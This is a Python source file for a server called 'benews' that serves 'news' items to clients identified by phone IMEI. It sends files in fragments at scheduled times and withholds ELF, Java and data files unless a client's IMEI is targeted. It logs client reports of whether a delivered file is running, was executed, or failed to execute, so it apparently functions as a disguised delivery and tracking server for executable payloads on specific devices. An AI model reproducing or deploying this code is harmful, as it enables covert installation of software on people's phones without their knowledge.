#!/usr/bin/env python
"""Simple server that listens on port 6954 and replies with a bson encoded news

Connect to it with:
nc localhost 6954
        nc 172.20.20.150 6954

"""
from __future__ import print_function
from gevent.server import StreamServer
import gevent
import signal
import bson
import struct
import subprocess
import os.path
import sys
import datetime
import time
import hashlib
from gevent.subprocess import Popen

class StaticVal:
    date = 'date'
    type = 'type'
    title = 'title'
    headline = 'headline'
    filepath = 'filepath'
    content = 'content'
    trials = 'trials'
    imei = 'imei'
    subject = 'subject'
    ts_trial = 'ts_trial'
    lts_status = 'lts_status'
    lts = 'lts'
    ltf = 'ltf'
    date_index = 0
    type_index = 4
    title_index = 1
    headline_index = 2
    filepath_index = 5
    content_index = 3
    trials_index = 7
    imei_index = 6
    subject_index = 8


def chunkstring(string, length):
    return list((string[0+i:length+i] for i in range(0, len(string), length)))

batch_file = "./batch.txt"


def validate_date(date_text):
    tokens=date_text.split(" ")
    if len(tokens) == 2:
        try:
            datetime.datetime.strptime(tokens[0], '%d-%m-%Y')
            datetime.datetime.strptime(tokens[1], '%H:%M')
        except ValueError:
            raise ValueError("Incorrect data format, should be DD-MM-YYYY HH:MM")
        return 0
    else:
        if(tokens[0].isdigit()):
            return 1;
        return -1;

def extract_news_from_line(line):
#Date|Title|headline|content|type|filepath|imei|trials|subject
    news = None
    line = line.rstrip()
    news_item = line.split("|")
    first = None

    if not line.isspace():
        for i in line:
            if i=='#' and first is None:
                printl("skipping comment")
                return news
            elif not i.isspace():
                first = i
        if len(news_item) == 9:

            if news_item[0] is not None:
                res_date = validate_date(news_item[0])
                if 0 <= res_date:
                    dateToUse= news_item[StaticVal.date_index]
                    if res_date != 1:
                        news = {'date': news_item[0], 'title': news_item[1], 'headline': news_item[2], 'content': news_item[3],
                                'type': news_item[4], 'filepath': news_item[5], 'imei': news_item[6], 'trials': news_item[7]}
                    else:
                        news_item[StaticVal.date_index] = ' '.join(news_item[StaticVal.date_index].split())
                        dateToUse = str(int(time.mktime(datetime.datetime.strptime(news_item[StaticVal.date_index], "%d-%m-%Y %H:%M").timetuple())))
                    news = {StaticVal.date : dateToUse, StaticVal.title: news_item[StaticVal.title_index], StaticVal.headline: news_item[StaticVal.headline_index], StaticVal.content: news_item[StaticVal.content_index],
                                StaticVal.type: news_item[StaticVal.type_index], StaticVal.filepath: news_item[StaticVal.filepath_index], StaticVal.imei: news_item[StaticVal.imei_index], StaticVal.trials: news_item[StaticVal.trials_index], StaticVal.subject: news_item[StaticVal.subject_index]}
                        #printl("Sending news %s" %news['filepath'])
                    #sanity check on news
                    if not news[StaticVal.date] or not news[StaticVal.date].isdigit():
                        printl("Invalid date field not present or not a digit")
                        news = None
                    if not news[StaticVal.filepath] or not os.path.exists(news[StaticVal.filepath]):
                        printl("Invalid filepath field not present or file not available")
                        news = None
                    else:
                        # we need to run ./tfc check to understand if the file is a special, but this imply that
                        # server must know the key..so we fix the behaviour simply with file
                        # get file command output:
                        if news and (not news[StaticVal.imei] or not len(news[StaticVal.imei])):
                            print("executing file check for news:%s" %news)

                            (file_cmd,cmd_err) = Popen(["which", "file"], stdout=subprocess.PIPE).communicate()
                            file_cmd = file_cmd.rstrip()
                            print("executing: %s" % file_cmd + " ./" +news[StaticVal.filepath])
                            (cmd_out,cmd_err) = Popen([file_cmd, "./"+news[StaticVal.filepath]], stdout=subprocess.PIPE).communicate()
                            if cmd_out:
                                print("calling cmd:%s" % cmd_out)
                                if ": data" in cmd_out or ": ELF" in cmd_out or ": Java" in cmd_out:
                                    printl("special news can't spread the word")
                                    news = None
                            if cmd_err:
                                print("error executing file check:%s" % cmd_err)
                        else:
                            print("skipping file check for null news")
    return news


def is_imei_valid(imei, client_imei):
    if imei and client_imei:
        if imei == client_imei:
            return True
        else:
            return False
    elif client_imei:
        return True
    return False


def is_ts_valid(ts, client_ts, trial, client_trial, client_cks=None):
    if ts and client_ts is not None and ts.isdigit():
        if client_ts == int(ts) and ( client_cks and (client_cks == "-2" or ( client_cks != "-3" and client_cks != "0" and client_cks != "-1" )) ):
            if trial is not None and trial.isdigit() and client_trial < int(trial):
                printl("is_ts_valid:more trials")
                return True
            else:
                printl("is_ts_valid:No more trials")
                return False
        elif client_ts < int(ts):
            return True
    return False


def get_next_news(client_param,client_stats):
    nline = 0;
    printl("checking imei %s" %client_param[StaticVal.imei])
    if os.path.exists(batch_file) and len(echo.translated_lines) == 0:
        opened = open(batch_file)

        for line in sorted(opened, key = str.lower):
            news = extract_news_from_line(line)
            if not news is None:
                echo.translated_lines.append(news)
            if len(echo.translated_lines) > 0:
                echo.translated_lines=sorted(echo.translated_lines, key=lambda news: news[StaticVal.date])
    cicle = -1
    for news in echo.translated_lines:
        if news:
            try:
                if not is_imei_valid(news[StaticVal.imei], client_param[StaticVal.imei]):
                    news = None
                    continue
                cicle += 1
                if not echo.next_news is None and cicle == 0:
                    if not client_param[StaticVal.lts_status] is None:
                        if client_param[StaticVal.lts_status] == "-3":
                            printl("Running %s" % echo.next_news[StaticVal.filepath])
                            return echo.next_news
                        if client_param[StaticVal.lts_status] == "-1":
                            printl("Executed %s" % echo.next_news[StaticVal.filepath])
                            news = None
                            continue
                        if client_param[StaticVal.lts_status] == "-2":
                            printl("Failed to Execute %s" % echo.next_news[StaticVal.filepath])
                        if client_param[StaticVal.lts_status] != "0":
                            printl("Failed to Send %s" % echo.next_news[StaticVal.filepath])
                        if client_param[StaticVal.lts_status] == "0":
                            printl("Correctly Sent %s" % echo.next_news[StaticVal.filepath])
                            news = None
                            continue
                now = time.time()
                if int(news[StaticVal.date]) > int(now):
                    printl("[%s]delay %s news to the correct moment"
                           % (datetime.datetime.fromtimestamp(now).strftime('%d-%m-%Y %H:%M'),
                              datetime.datetime.fromtimestamp(int(news[StaticVal.date])).strftime('%d-%m-%Y %H:%M')))
                    news = None
                    continue
                if is_ts_valid(news[StaticVal.date], client_param['ts'], news[StaticVal.trials], client_stats[StaticVal.ts_trial], client_param[StaticVal.lts_status]):
                    client_stats[StaticVal.ts_trial] = int(client_stats[StaticVal.ts_trial]) + 1
                    printl("sending file %s" % news[StaticVal.filepath])
                    break
                else:
                    news = None
                    continue
            except:
                news = None
                continue

        #else:
            #printl("invalid line:\n%s" % line)
    return news


def mysend(socket,msg):
        MSGLEN = len(msg)
        totalsent = 0
        while totalsent < MSGLEN:
            sent = socket.send(msg[totalsent:])
            if sent == 0:
                raise RuntimeError("socket connection broken")
            totalsent = totalsent + sent


def myreceive(socket):
        chunk = socket.recv(4)
        if chunk == b'':
            raise RuntimeError("socket connection broken")
        size =  struct.unpack("<L",chunk)[0] - 4
        printl("message is long %d" % size)
        try:
            chunk += socket.recv(size)
            if chunk == b'':
                raise RuntimeError("socket connection broken")
        except MemoryError as e:
            printl("memory Error:%s" % e)
        return chunk



debug=1


def printl(*s):
    if not echo._file_logs or echo._file_logs.closed:
        return False
    for i in s:
        if debug:
            print(i)
        echo._file_logs.write(i)
    echo._file_logs.write("\n")
    echo._file_logs.flush()
    return True


def close_log_file():
    if echo._file_logs and not echo._file_logs.closed:
        echo._file_logs.close
    return


def open_log_file(dir):
    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H.%M')
    filename = dir+"/"+st+".log"
    print("opening file for log:%s" % filename)
    try:
        echo._file_logs = open(filename, "wa")
    except IOError as err:
        print("unable to open file :%s %s" % (filename, err))
        echo._file_logs = None
    return echo._file_logs


def save_bad_request(ip, port, data, dir):
    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H.%M')
    filename =dir+"/"+ip+"_"+"%s" %port+st+".dump"
    printl("invalid payload passed! saving to:%s" % filename)
    try:
        file = open(filename, "wa")
    except:
        printl("unable to open file :%s" % filename)
        return False
    statinfo = os.stat(filename)
    initial_size=statinfo.st_size
    if data is None:
        file.write("no data recived")
    else:
        file.write(data)
    file.flush()
    file.close()
    statinfo = os.stat(filename)
    return initial_size != statinfo.st_size


# this handler will be run for each incoming connection in a dedicated greenlet
clients = {}

def echo(socket, address):

    printl('New connection from %s:%s' % address)
    (ip, port) = address
    data = None
    try:
        data = myreceive(socket)
        if data is None:
            return
        client_param = bson.loads(data)
    except:
        save_bad_request(ip, port, data, dump_dir)
        socket.close
        return



    #{u'imei': 1, u'ts': 23}
    #add new clients to clients list
    incoming_imei = "%s", client_param[StaticVal.imei]
    if not clients.has_key(client_param[StaticVal.imei]):
        printl("adding new client ", client_param[StaticVal.imei])
        clients[client_param[StaticVal.imei]] = {StaticVal.lts: 0, StaticVal.ltf: 0, StaticVal.ts_trial: 0}
    else:
        printl("client already present", client_param[StaticVal.imei])

    printl("read: %s" % client_param)
    if not client_param:
        printl("client disconnected")
        return
        # [ ts:long,frag:int,type:int,payload:b]


    #check if there are more fragment to sent
    #if (clients[client_param['imei']][StaticVal.lts] == client_param['ts'] and clients[client_param['imei']][StaticVal.ltf] != 0) and  next_news:
    next_news=echo.next_news

    if echo.fragment > 0:
        if client_param[StaticVal.lts_status] != "0":
            printl("Failed to Send fragment %d for file %s trials %s/%s" %
                  (echo.fragment, next_news[StaticVal.imei], clients[client_param[StaticVal.imei]][StaticVal.ts_trial], next_news[StaticVal.trials]))
            if next_news[StaticVal.trials].isdigit() and int(next_news[StaticVal.trials]) >= int(clients[client_param[StaticVal.imei]][StaticVal.ts_trial]):
                printl("try again")
                echo.fragment += 1
            else:
                printl("no mor trial")
                clients[client_param[StaticVal.imei]][StaticVal.lts] = int(clients[client_param[StaticVal.imei]][StaticVal.lts]) + 1
                echo.fragment = 0


    if echo.fragment == 0:
        echo.next_news = get_next_news(client_param, clients[client_param[StaticVal.imei]])
        next_news = echo.next_news
        if next_news and client_param[StaticVal.lts_status] != '-3':
            echo.file_list = None
            printl ("ready to send another news")
            clients[client_param[StaticVal.imei]][StaticVal.lts] = next_news['date']
            if os.path.isabs(next_news[StaticVal.filepath]):
                file=dumpImage(next_news[StaticVal.filepath])
            else:
                file=dumpImage(os.path.dirname(os.path.realpath(__file__))+"/"+next_news[StaticVal.filepath])
            if file:
                printl("image is valid")
                echo.file_list = chunkstring(file,echo.fragmentSize)
                echo.fragment = len(echo.file_list)
                clients[client_param[StaticVal.imei]][StaticVal.ltf] = echo.fragment

    if echo.file_list is not None and next_news and echo.fragment > 0:

        sha1 = hashlib.sha1(echo.file_list[echo.fragment-1]).hexdigest()
        repl = bson.dumps({"ts": long(next_news[StaticVal.date]) , "frag": echo.fragment-1 , StaticVal.type: int(next_news[StaticVal.type]),
                           StaticVal.headline: next_news[StaticVal.headline], "payload": echo.file_list[echo.fragment-1],
                           StaticVal.content: next_news[StaticVal.content], StaticVal.title: next_news[StaticVal.title], "sha1": sha1, StaticVal.subject: next_news[StaticVal.subject]
        })
        echo.fragment-=1;
        if echo.fragment > 0 and int(clients[client_param[StaticVal.imei]][StaticVal.ts_trial])>0:
            printl("reset trials for file %s" % next_news[StaticVal.filepath])
            clients[client_param[StaticVal.imei]][StaticVal.ts_trial] = int(clients[client_param[StaticVal.imei]][StaticVal.ts_trial]) + 1
        clients[client_param[StaticVal.imei]][StaticVal.ltf] = echo.fragment
        mysend(socket,repl)
        if echo.file_list is not None:
            printl("frag=[%d/%d] frag=%d" % ( int(len(echo.file_list) - (echo.fragment)) , int(len(echo.file_list)), echo.fragment) )

    #else:
    #    repl = bson.dumps({"ts":-1L,"frag":0,"type":1,"payload":b"null image"})

    printl("closing socket")

    socket.close()


echo.fragment=0
echo.file_list=None
echo.fragmentSize=2**20
echo.fragmentSize=100000
echo.next_news=None
echo._file_logs = None
echo.translated_lines = []
def dumpImage(filename):
    if os.path.exists(filename):
        with open(filename, 'rb') as f:
            content = f.read()
        return content
        #return binascii.hexlify(content)

    return None


def check_dir(dir):
    if not os.path.exists(dir):
        d = os.mkdir(dir)
    if os.path.exists(dir):
        return True
    return False

dump_dir = "./dumps"
log_dir = "./logs"


if __name__ == '__main__':
    if not check_dir(dump_dir):
        print ("unable to create %s" % dump_dir)
        exit
    if not check_dir(log_dir):
        print ("unable to create %s" % log_dir)
        exit
    if not open_log_file(log_dir):
        exit
    bson.patch_socket()
    # to make the server use SSL, pass certfile and keyfile arguments to the constructor
    server = StreamServer(('localhost', 8080), echo)
    # to start the server asynchronously, use its start() method;
    # we use blocking serve_forever() here because we have no other jobs
    print('Starting benews server on port 8080')
    printl('Starting benews server on port 8080')
    #gevent.signal(signal.SIGTERM, server.close)
    #gevent.signal(signal.SIGINT, server.close)
    if len(sys.argv) > 1:
        print('arg passed for batch file %s' % sys.argv[1])
        printl('arg passed for batch file %s' % sys.argv[1])
        batch_file = sys.argv[1]

    server.serve_forever()